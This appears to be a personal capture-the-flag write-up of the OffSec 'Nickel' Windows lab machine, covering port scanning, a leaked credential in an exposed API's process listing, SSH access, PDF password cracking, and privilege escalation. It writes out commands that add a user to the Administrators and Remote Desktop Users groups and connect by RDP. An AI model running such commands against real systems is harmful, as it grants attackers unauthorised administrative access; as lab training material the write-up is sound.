---
title: "Nickel"
date: 2026-04-02
draft: false
description: "OffSec Nickel writeup"
tags: ["windows", "hard", "oscp"]
categories: ["CTF Writeups"]
showTableOfContents: true
showReadingTime: true
showWordCount: true
---

# Nickel

## Overview

- **OS:** Windows
- **IP:** 192.168.117.99
- **Difficulty:** Hard
- **Platform:** OffSec
- **OSCP:** Yes
- **Lists:** N/A

### Summary

exposed  api endpoint gave weak creds , privesc with web hosted taking arguments.

## Loot

| Loot |  |
| --- | --- |
| **Category** | **Details** |
| Usernames |  |
| Passwords |  |
| Usernames+Passwords |  |
| Hashes |  |
| Service Versions |  |

## Enumeration

## Nmap

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.60 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
|_  256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=nickel
| Not valid before: 2025-12-06T11:11:21
|_Not valid after:  2026-06-07T11:11:21
|_ssl-date: 2026-04-02T13:07:47+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: NICKEL
|   NetBIOS_Domain_Name: NICKEL
|   NetBIOS_Computer_Name: NICKEL
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel
|   Product_Version: 10.0.18362
|_  System_Time: 2026-04-02T13:06:39+00:00
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-HTTPAPI/2.0
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC

```

## Dirbusting

```

```

## Port 8089

Web behavior was the main signal here, so I traced each response change before exploitation.

{{< figure src="image 970.png" >}}

clicking them does nothing

{{< figure src="image 971.png" >}}

seems to be calling port 3333 w get

when we curl it shows this

{{< figure src="image 972.png" >}}

lets try post

{{< figure src="image 973.png" >}}

{{< figure src="image 974.png" >}}

## Exploitation

```
name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh

```

lets ssh in now

wasnt working then i noticed its probably  encrypted

{{< figure src="image 975.png" >}}

annnd we are in

{{< figure src="image 976.png" >}}

on getting the pdf file and cracking it with pdf2john we see this

{{< figure src="image 977.png" >}}

netstat shows us port 80 is open

{{< figure src="image 978.png" >}}

{{< figure src="image 979.png" >}}

and then 

```
net localgroup Administrators fatcat /add
```

```
net localgroup 'Remote Desktop Users' fatcat /add
```

and now we can just rdp in

```
└─$ xfreerdp /cert:ignore /dynamic-resolution +clipboard /u:'fatcat' /p:'password'  /v:NICKEL

```

{{< figure src="image 980.png" >}}
